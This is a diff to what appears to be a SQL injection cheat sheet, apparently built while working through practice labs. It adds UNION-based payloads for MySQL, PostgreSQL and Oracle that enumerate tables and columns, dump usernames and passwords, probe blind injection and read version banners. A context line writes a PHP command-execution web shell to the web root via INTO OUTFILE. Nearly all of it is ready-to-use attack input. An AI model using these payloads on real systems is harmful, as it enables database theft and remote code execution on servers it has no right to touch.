@@ -282,7 +282,7 @@ admin'--
 Check for SQLi:
 ' OR 1=1
 
-Check columns:
+Check columns if id and postgresql / mysql db::
 id=1 order by 5
 id=-1 union select 1,2,3,4
 id=-1 union select 1,2,version(),4
@@ -290,6 +290,27 @@ id=-1 union select 1,2,user(),4
 id=1 union all select 1,2,group_concat(table_name),4 from information_schema.tables where table_schema=database() --+
 id=1 union all select 1,,2,group_concat(column_name),4 from information_schema.columns where table_schema=database() and table_name='users'--+
 id=1 union all select group_concat(id),group_concat(username),group_concat(password) from users where table_schema=database()--+
+id=Gifts' union select 1,2,concat(username, ' ', password),4 from users --+
+filter?category=Accessories' union all select table_name,NULL FROM information_schema.tables --%20
+
+if query and where, dual for oracle db:
+filter?category=Accessories' union all select 'a','b' from dual--%20
+filter?category=Accessories' union all select banner,'b' from v$version--%20
+filter?category=Accessories' union all select column_name,null FROM USER_TAB_COLUMNS WHERE table_name = 'USERS_ZFQQIK' --%20
+
+Blind SQL Injection:
+and 1=2 union select null from users where password like 'a%' --+
+
+
+Check string output fields
+filter?category=Gifts' union select null,'a',null --+
+
+Get banner:
+Oracle:     SELECT banner FROM v$version
+SELECT:     version FROM v$instance
+Microsoft:  SELECT @@version
+PostgreSQL: SELECT version()
+MySQL:      SELECT @@version
 
 In SQL:
 select '<?php $cmd=$_GET["cmd"];system($cmd);?>' INTO OUTFILE '/var/www/html/shell.php';
